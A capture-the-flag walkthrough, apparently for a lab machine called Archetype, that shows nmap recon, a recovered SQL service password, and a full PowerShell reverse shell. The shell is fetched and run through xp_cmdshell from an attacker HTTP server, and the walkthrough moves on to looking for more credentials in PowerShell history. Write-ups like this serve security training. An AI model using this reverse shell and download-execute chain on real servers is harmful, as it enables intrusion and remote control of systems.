## Recon/Enumeration

nmap -A 10..10.10.27  
![alt text](./img/archetype01.png?raw=true)  
![alt text](./img/archetype02.png?raw=true)  
![alt text](./img/archetype03.png?raw=true)  

Let’s get this file and read it  
![alt text](./img/archetype04.png?raw=true)  

Found a credential:
- User = ARCHETYPE\sql_svc
- Password = M3g4c0rp123

## Exploit

DTConfiguration is part of a SQL Server configuration. So let’s try to connect to it  
![alt text](./img/archetype05.png?raw=true)

We found some tables with the command: “select * from information_schema.tables”. However there is nothing useful inside. So let’s see if we can execute commands here.  
Doing a research we can find something about xp_cmdshell.  
![alt text](./img/archetype06.png?raw=true)

Wow, let’s try to obtain more info about the system (if need to activate xp_cmdshell try this link)  
![alt text](./img/archetype07.png?raw=true)

Now let’s create as reverse shell ps1 file:

> $client = New-Object System.Net.Sockets.TCPClient("10.10.14.7",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"# ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

After create the file set an http server and a listener:

sudo python3 -m http.server 80  
nc -nvlp 4444  

On the compromised machine run the command:  
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.7/shell.ps1\")"

A shell must appear in the nc listening port.

## Privesc  
Since we are running Powershell, let’s see the command history executed in it  
![alt text](./img/archetype08.png?raw=true)  

Ok, another credential. Let’s try to use it wit smbclient  
![alt text](./img/archetype09.png?raw=true)

## Discovery

